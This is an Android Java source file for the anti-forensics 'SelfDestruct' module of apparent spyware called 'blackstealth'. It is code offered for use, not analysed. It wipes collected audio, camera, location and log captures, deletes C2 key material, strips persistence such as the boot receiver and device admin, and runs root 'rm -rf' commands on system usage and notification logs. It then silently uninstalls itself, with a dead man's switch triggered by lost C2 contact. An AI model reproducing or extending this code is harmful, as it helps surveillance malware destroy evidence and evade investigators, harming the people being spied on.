package com.offensive.blackstealth.antiforensics;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import java.io.*;
import java.util.*;

/**
 * Self-Destruct Module
 * Complete evidence destruction and self-removal
 */
public class SelfDestruct {
    private static final String TAG = "SelfDestruct";
    
    private Context context;
    private LogWiper logWiper;
    private List<Runnable> destructionTasks;
    private boolean triggered = false;
    
    public interface DestructCallback {
        void onDestructionStarted();
        void onProgress(String stage, int percent);
        void onDestructionComplete();
    }
    
    private DestructCallback callback;
    
    public SelfDestruct(Context context) {
        this.context = context;
        this.logWiper = new LogWiper(context);
        this.destructionTasks = new ArrayList<>();
        initializeTasks();
    }
    
    public void setCallback(DestructCallback callback) {
        this.callback = callback;
    }
    
    private void initializeTasks() {
        // Order matters - execute in sequence
        destructionTasks.add(this::wipeAppData);
        destructionTasks.add(this::wipeExfiltratedData);
        destructionTasks.add(this::wipeConfigurations);
        destructionTasks.add(this::wipeKeyMaterial);
        destructionTasks.add(this::removePeristenceMechanisms);
        destructionTasks.add(this::clearSystemTraces);
        destructionTasks.add(this::uninstallSelf);
    }
    
    /**
     * Trigger complete self-destruction
     */
    public void trigger() {
        if (triggered) return;
        triggered = true;
        
        Log.w(TAG, "Self-destruct triggered!");
        if (callback != null) callback.onDestructionStarted();
        
        new Thread(() -> {
            int total = destructionTasks.size();
            for (int i = 0; i < total; i++) {
                try {
                    String stage = getStage(i);
                    if (callback != null) {
                        callback.onProgress(stage, (i * 100) / total);
                    }
                    
                    destructionTasks.get(i).run();
                    Thread.sleep(500);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Destruction task failed: " + e.getMessage());
                }
            }
            
            if (callback != null) callback.onDestructionComplete();
        }).start();
    }
    
    private String getStage(int index) {
        switch (index) {
            case 0: return "Wiping app data";
            case 1: return "Removing collected data";
            case 2: return "Clearing configurations";
            case 3: return "Destroying keys";
            case 4: return "Removing persistence";
            case 5: return "Clearing system traces";
            case 6: return "Uninstalling";
            default: return "Processing";
        }
    }
    
    /**
     * Wipe all app data
     */
    private void wipeAppData() {
        try {
            // Clear all app directories
            File dataDir = new File(context.getApplicationInfo().dataDir);
            secureWipeDirectory(dataDir);
            
            // Clear cache
            secureWipeDirectory(context.getCacheDir());
            
            // Clear external files
            File externalDir = context.getExternalFilesDir(null);
            if (externalDir != null) {
                secureWipeDirectory(externalDir);
            }
            
            Log.i(TAG, "App data wiped");
        } catch (Exception e) {}
    }
    
    /**
     * Wipe all exfiltrated/collected data
     */
    private void wipeExfiltratedData() {
        try {
            String[] dataDirs = {"logs", "audio", "camera", "location", "captures"};
            
            for (String dir : dataDirs) {
                File dataDir = new File(context.getFilesDir(), dir);
                if (dataDir.exists()) {
                    secureWipeDirectory(dataDir);
                }
            }
            
            Log.i(TAG, "Exfiltrated data wiped");
        } catch (Exception e) {}
    }
    
    /**
     * Wipe configurations
     */
    private void wipeConfigurations() {
        try {
            // Clear SharedPreferences
            File prefsDir = new File(context.getApplicationInfo().dataDir, "shared_prefs");
            if (prefsDir.exists()) {
                for (File f : prefsDir.listFiles()) {
                    secureWipeFile(f);
                }
            }
            
            // Clear databases
            File dbDir = new File(context.getApplicationInfo().dataDir, "databases");
            if (dbDir.exists()) {
                secureWipeDirectory(dbDir);
            }
            
            Log.i(TAG, "Configurations wiped");
        } catch (Exception e) {}
    }
    
    /**
     * Wipe cryptographic key material
     */
    private void wipeKeyMaterial() {
        try {
            // Clear Android Keystore entries
            java.security.KeyStore keyStore = java.security.KeyStore.getInstance("AndroidKeyStore");
            keyStore.load(null);
            
            Enumeration<String> aliases = keyStore.aliases();
            while (aliases.hasMoreElements()) {
                String alias = aliases.nextElement();
                if (alias.contains("blackstealth") || alias.contains("c2")) {
                    keyStore.deleteEntry(alias);
                }
            }
            
            Log.i(TAG, "Key material wiped");
        } catch (Exception e) {}
    }
    
    /**
     * Remove all persistence mechanisms
     */
    private void removePeristenceMechanisms() {
        try {
            // Cancel any alarms
            android.app.AlarmManager am = (android.app.AlarmManager) 
                context.getSystemService(Context.ALARM_SERVICE);
            // Would need PendingIntent reference
            
            // Cancel any scheduled jobs
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                android.app.job.JobScheduler js = (android.app.job.JobScheduler)
                    context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
                js.cancelAll();
            }
            
            // Disable any components
            PackageManager pm = context.getPackageManager();
            String packageName = context.getPackageName();
            
            // Try to disable boot receiver
            try {
                ComponentName bootReceiver = new ComponentName(packageName,
                    packageName + ".BootReceiver");
                pm.setComponentEnabledSetting(bootReceiver,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            } catch (Exception e) {}
            
            // Remove device admin if enabled
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName adminComponent = new ComponentName(context,
                    context.getPackageName() + ".DeviceAdmin");
                if (dpm.isAdminActive(adminComponent)) {
                    dpm.removeActiveAdmin(adminComponent);
                }
            } catch (Exception e) {}
            
            Log.i(TAG, "Persistence mechanisms removed");
        } catch (Exception e) {}
    }
    
    /**
     * Clear all system-level traces
     */
    private void clearSystemTraces() {
        logWiper.wipeAll();
        logWiper.wipeBrowserData();
        
        // Additional cleanup
        try {
            // Clear recent apps
            executeRoot("am kill-all");
            
            // Clear package usage stats
            executeRoot("rm -rf /data/system/usagestats/*");
            
            // Clear notification log
            executeRoot("rm -rf /data/system/notification_log/*");
            
        } catch (Exception e) {}
        
        Log.i(TAG, "System traces cleared");
    }
    
    /**
     * Uninstall the application
     */
    private void uninstallSelf() {
        String packageName = context.getPackageName();
        
        // Try silent uninstall (requires root or device owner)
        try {
            executeRoot("pm uninstall " + packageName);
        } catch (Exception e) {
            // Fallback to user uninstall prompt
            try {
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + packageName));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception ex) {}
        }
        
        Log.i(TAG, "Uninstall initiated");
    }
    
    /**
     * Securely wipe a directory
     */
    private void secureWipeDirectory(File dir) {
        if (dir == null || !dir.exists()) return;
        
        File[] files = dir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    secureWipeDirectory(file);
                } else {
                    secureWipeFile(file);
                }
            }
        }
        dir.delete();
    }
    
    /**
     * Securely wipe a file
     */
    private void secureWipeFile(File file) {
        if (!file.exists() || !file.canWrite()) {
            file.delete();
            return;
        }
        
        try {
            long length = file.length();
            RandomAccessFile raf = new RandomAccessFile(file, "rw");
            
            byte[] buffer = new byte[4096];
            Random random = new Random();
            
            // Overwrite with random data
            for (int pass = 0; pass < 3; pass++) {
                raf.seek(0);
                long remaining = length;
                while (remaining > 0) {
                    random.nextBytes(buffer);
                    int toWrite = (int) Math.min(buffer.length, remaining);
                    raf.write(buffer, 0, toWrite);
                    remaining -= toWrite;
                }
            }
            
            // Overwrite with zeros
            raf.seek(0);
            Arrays.fill(buffer, (byte) 0);
            long remaining = length;
            while (remaining > 0) {
                int toWrite = (int) Math.min(buffer.length, remaining);
                raf.write(buffer, 0, toWrite);
                remaining -= toWrite;
            }
            
            raf.close();
            
            // Rename and delete
            File temp = new File(file.getParent(), UUID.randomUUID().toString());
            file.renameTo(temp);
            temp.delete();
            
        } catch (Exception e) {
            file.delete();
        }
    }
    
    private void executeRoot(String command) throws Exception {
        Process su = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(su.getOutputStream());
        os.writeBytes(command + "\n");
        os.writeBytes("exit\n");
        os.flush();
        su.waitFor();
    }
    
    /**
     * Dead man's switch - trigger if no C2 contact for specified time
     */
    public void enableDeadManSwitch(long timeoutMs) {
        new Thread(() -> {
            try {
                Thread.sleep(timeoutMs);
                if (!triggered) {
                    Log.w(TAG, "Dead man's switch triggered - no C2 contact");
                    trigger();
                }
            } catch (InterruptedException e) {}
        }).start();
    }
    
    /**
     * Geofence trigger - destroy if device leaves area
     */
    public void enableGeofenceTrigger(double lat, double lng, float radiusMeters) {
        // Would integrate with LocationTracker
        Log.i(TAG, "Geofence trigger enabled");
    }
}
